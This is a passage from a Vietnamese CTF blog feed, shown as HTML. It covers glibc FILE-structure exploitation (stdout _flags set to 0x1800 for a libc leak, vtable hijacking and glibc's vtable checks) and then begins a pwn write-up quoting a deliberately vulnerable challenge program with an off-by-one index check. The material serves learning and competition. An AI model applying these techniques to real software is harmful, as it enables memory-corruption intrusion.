</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">!=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">off64_t</span> new_pos
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSSEEK</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">-</span> fp<span style="color:#f92672">-&gt;</span>_IO_read_end, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (new_pos <span style="color:#f92672">==</span> _IO_pos_BAD)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> new_pos;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSWRITE</span> (fp, data, to_do);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">&amp;&amp;</span> count)
</span></span><span style="display:flex;"><span>    fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_adjust_column</span> (fp<span style="color:#f92672">-&gt;</span>_cur_column <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, data, count) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">_IO_setg</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base, fp<span style="color:#f92672">-&gt;</span>_IO_buf_base);
</span></span><span style="display:flex;"><span>  fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_ptr <span style="color:#f92672">=</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base;
</span></span><span style="display:flex;"><span>  fp<span style="color:#f92672">-&gt;</span>_IO_write_end <span style="color:#f92672">=</span> (fp<span style="color:#f92672">-&gt;</span>_mode <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>		       <span style="color:#f92672">&amp;&amp;</span> (fp<span style="color:#f92672">-&gt;</span>_flags <span style="color:#f92672">&amp;</span> (_IO_LINE_BUF <span style="color:#f92672">|</span> _IO_UNBUFFERED))
</span></span><span style="display:flex;"><span>		       <span style="color:#f92672">?</span> fp<span style="color:#f92672">-&gt;</span>_IO_buf_base : fp<span style="color:#f92672">-&gt;</span>_IO_buf_end);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> count;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>fp-&gt;_flags &amp; _IO_IS_APPENDING</code> cần phải trả về True để không bị vướng vào câu lệnh if hỗn độn ngay dưới nó :&gt;</p>
<p>Nếu không thõa mãn điều kiện này thì ta thử đi vào câu lệnh nhánh if phía dưới:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (fp<span style="color:#f92672">-&gt;</span>_IO_read_end <span style="color:#f92672">!=</span> fp<span style="color:#f92672">-&gt;</span>_IO_write_base)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">off64_t</span> new_pos
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">=</span> <span style="color:#a6e22e">_IO_SYSSEEK</span> (fp, fp<span style="color:#f92672">-&gt;</span>_IO_write_base <span style="color:#f92672">-</span> fp<span style="color:#f92672">-&gt;</span>_IO_read_end, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (new_pos <span style="color:#f92672">==</span> _IO_pos_BAD)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      fp<span style="color:#f92672">-&gt;</span>_offset <span style="color:#f92672">=</span> new_pos;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>So sánh giá trị <code>fp-&gt;_IO_read_end</code> và <code>fp-&gt;_IO_write_base</code> nếu khác nhau, sẽ gọi hàm <code>_IO_SYSSEEK()</code>. Bởi vì giá trị của <code>fp-&gt;_IO_read_end</code> và <code>fp-&gt;_IO_write_base</code> đang bằng nhau nên có thể dễ dàng bypass được kiện check. ĐI sâu vào bên trong, <code>_IO_SYSSEEK()</code> sẽ gọi syscall <code>lseek()</code> với tham số là <code>offset=fp-&gt;_IO_write_base - fp-&gt;_IO_read_end</code>. Vì vậy, nếu <code>fp-&gt;_IO_write_base</code> &lt; <code>fp-&gt;_IO_read_end</code> thì <code>offset</code> sẽ có giá trị âm và làm cho chương trình báo lỗi. Như vậy, để nó không xảy ra thì ta chỉ cần overwrite LSB của <code>fp-&gt;_IO_write_base</code> thành null byte, nhưng muốn chắc thì ta cũng overwrite LSB của<code>fp-&gt;_IO_write_base</code> thành null.</p>
<p><code>fp-&gt;_flags &amp; _IO_IS_APPENDING = 1</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c8699d</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>    mov    rbp, rdx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869a0</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>    push   rbx
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869a1</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>    mov    rbx, rdi
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869a4</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">52</span><span style="color:#f92672">&gt;</span>    sub    rsp, <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869a8</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span><span style="color:#f92672">&gt;</span>    mov    r14, qword ptr [rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd8</span>]
</span></span><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x7ffff7c869af</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">63</span><span style="color:#f92672">&gt;</span>    test   dword ptr [rdi], <span style="color:#ae81ff">0x1000</span>       <span style="color:#f92672">&lt;</span>_IO_2_1_stdout_<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x7ffff7c869b5</span> <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>    jne    _IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">272</span>                <span style="color:#f92672">&lt;</span>_IO_do_write<span style="color:#f92672">+</span><span style="color:#ae81ff">272</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p><code>_IO_IS_APPENDING = 0x1000</code></p>
<ul>
<li><code>fp-&gt;_flags &amp; 0x1000 == 1</code></li>
</ul>
<p>Vậy, tổng kết như sau:</p>
<pre tabindex="0"><code>stdout-&gt;_flags &amp; _IO_NO_WRITES         == 0
stdout-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 1
stdout-&gt;_flags &amp; _IO_IS_APPENDING      == 1
</code></pre><p>_flags &amp; 0x8 = 0
_flags &amp; 0x800 = 1
_flags &amp; 0x1000 = 1
<strong>-&gt; _flags = 0x1800</strong></p>
<p>Tương tự với READ PRIMITIVE, WRITE PRIMITIVE cũng cần 1 số điều kiện để chúng có thể hoạt động, chỉ cần chúng ta điều khiển được các giá trị <code>_IO_read_end</code>, <code>_IO_read_ptr</code>,&hellip; là được.
Vậy, chúng ta đã thành công bypass được tất cả các hạn chế và chỉ cần ghi vào <code>f-&gt;_IO_write_ptr</code> , <code>f-&gt;_IO_write_base</code> những giá trị phù hợp để khai thác, ta sẽ có được <del>LIBC BASE</del> , khi đã có <del>LIBC BASE</del>, ta có thể tiếp tục dùng <code>FSOP</code> để điều khiển được luồng thực thi nhờ <code>VTABLE HIJACKING</code> như phần trên mình đã nói (và rõ ràng là ở GLIBC-2.35 thì gần như đã full đồ, full giáp nên việc tấn công FSOP rất là khó và phải cần rất nhiều kiến thức và hiểu rõ bản chất để có thể đi sâu hơn trong kĩ thuật này) !</p>
<h3 id="4-vtable-hijacking">4. VTABLE-HIJACKING</h3>
<p>Ta đã thành công giải quyết được vấn đề READ/WRITE PRIMITIVE trên GLIBC-2.35, làm sao ta có thể điều khiển được luồng thực thi từ chương trình nếu như không thể bypass được loạt check trên.</p>
<h3 id="5-protection-mechanism">5. PROTECTION MECHANISM</h3>
<p>Từ phiên bản <code>Glibc-2.24</code> trở đi, khi ta ghi đè vào vtable thì sẽ không còn chiếm quyền điều khiển được nữa. Bởi vì chương trình sẽ kiểm tra tính hợp lệ của địa chỉ <code>vtable</code> trước khi gọi hàm ảo.</p>
<p>Hai hàm <code>IO_validate_vtable</code> and <code>_IO_vtable_check</code> được thêm vào.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> _IO_jump_t <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">IO_validate_vtable</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> _IO_jump_t <span style="color:#f92672">*</span>vtable)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Fast path: The vtable pointer is within the __libc_IO_vtables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     section.  */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uintptr_t</span> section_length <span style="color:#f92672">=</span> __stop___libc_IO_vtables <span style="color:#f92672">-</span> __start___libc_IO_vtables;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>) vtable;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uintptr_t</span> offset <span style="color:#f92672">=</span> ptr <span style="color:#f92672">-</span> __start___libc_IO_vtables;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">__glibc_unlikely</span> (offset <span style="color:#f92672">&gt;=</span> section_length))
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* The vtable pointer is not in the expected section.  Use the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       slow path, which will terminate the process if necessary.  */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_IO_vtable_check</span> ();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> vtable;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Hàm kiểm tra xem con trỏ vtable có nằm trong phần <code>__libc_IO_vtables</code> hay không. Nếu không, nó sẽ tiếp tục gọi đến <code>_IO_vtable_check</code> .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> attribute_hidden
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">_IO_vtable_check</span> (<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SHARED
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>flag) (<span style="color:#66d9ef">void</span>) <span style="color:#f92672">=</span> <span style="color:#a6e22e">atomic_load_relaxed</span> (<span style="color:#f92672">&amp;</span>IO_accept_foreign_vtables);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef PTR_DEMANGLE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">PTR_DEMANGLE</span> (flag);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (flag <span style="color:#f92672">==</span> <span style="color:#f92672">&amp;</span>_IO_vtable_check)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    Dl_info di;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> link_map <span style="color:#f92672">*</span>l;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (_dl_open_hook <span style="color:#f92672">!=</span> NULL
</span></span><span style="display:flex;"><span>       <span style="color:#f92672">||</span> (<span style="color:#a6e22e">_dl_addr</span> (_IO_vtable_check, <span style="color:#f92672">&amp;</span>di, <span style="color:#f92672">&amp;</span>l, NULL) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&amp;&amp;</span> l<span style="color:#f92672">-&gt;</span>l_ns <span style="color:#f92672">!=</span> LM_ID_BASE))
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#else </span><span style="color:#75715e">/* !SHARED */</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (__dlopen <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__libc_fatal</span> (<span style="color:#e6db74">&#34;Fatal error: glibc detected an invalid stdio handle</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nếu <code>vtable</code> không hợp lệ, chương trình sẽ dừng lại và báo lỗi.</p>
<h3 id="references">References</h3>
<p><a href="https://chovid99.github.io/posts/file-structure-attack-part-1/">https://chovid99.github.io/posts/file-structure-attack-part-1/</a>
<a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a>
<a href="https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/">https://nightrainy.github.io/2019/08/07/play-withe-file-structure-%E6%90%AC%E8%BF%90/</a>
<a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a>
<a href="https://en.wikipedia.org/wiki/Virtual_method_table">https://en.wikipedia.org/wiki/Virtual_method_table</a>
<a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/">https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/</a>
<a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">https://blog.kylebot.net/2022/10/22/angry-FSROP/</a>
<a href="https://bbs.kanxue.com/thread-273832.htm">https://bbs.kanxue.com/thread-273832.htm</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>W1 TEST 2023</title>
      <link>https://w1n-gl0ry.github.io/posts/w1_test/</link>
      <pubDate>Tue, 01 Aug 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/w1_test/</guid>
      <description><![CDATA[<p>Tuần vừa rồi mình có tham gia giải mini-CTF về 3 mảng (web, forensics, crypto) của CLB W1, nhưng thật không may, vì không chuyên vào các mảng này và cũng không tiếp xúc nhiều nên mình chỉ làm được 1 ít và dừng chân ở top 11 (khá là tiếc vì chỉ còn 1 chút nữa là mình đã pass kì test). Tuy nhiên, qua bài test đó, mình đã học rất nhiều thứ bổ ích. Tuần này quay trở lại bài test về binary (gồm Pwn và Reverse), bài test gồm 2 bài Pwn và 5 bài Reverse, mình đã hoàn thành 6/7 bài, và thật tiếc khi không đủ time để làm bài cuối</p>
<p>Mình xin trình bày một số bài mà mình đã làm được</p>
<h2 id="pwn">Pwn</h2>
<h3 id="1-vector_calc">1. Vector_Calc</h3>
<p><code>Host: nc 45.122.249.68 20017</code></p>
<p><code>Description: My vector calculator is complete. However, I feel something is not right about this program. Can you find it?</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/chall">bin</a>, <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c">src</a></p>
<p><a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c">chall.c</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_FAVES 4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_VECTORS 3
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>printFunc)(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> Vector v_list[MAX_VECTORS];
</span></span><span style="display:flex;"><span>__uint64_t<span style="color:#f92672">*</span> sum;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> faves[MAX_FAVES];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printData</span>(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">enterData</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v;
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter x: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>x);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter y: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printData</span>(<span style="color:#66d9ef">struct</span> Vector<span style="color:#f92672">*</span> v){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Data: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;v = [%lu %lu]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v<span style="color:#f92672">-&gt;</span>x,v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sumVector</span>(){
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Save the sum to index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( i <span style="color:#f92672">!=</span> idx){
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> v_list[idx].x;
</span></span><span style="display:flex;"><span>            ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> v_list[idx].y;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">loadFavorite</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    faves[idx] <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> Vector));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">printFavorite</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%lu&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( ((__uint64_t <span style="color:#f92672">*</span>)faves[idx])[<span style="color:#ae81ff">2</span>] )
</span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(faves[idx]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">struct</span> Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">printFunc</span>(faves[idx]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addFavorute</span>(){
</span></span><span style="display:flex;"><span>
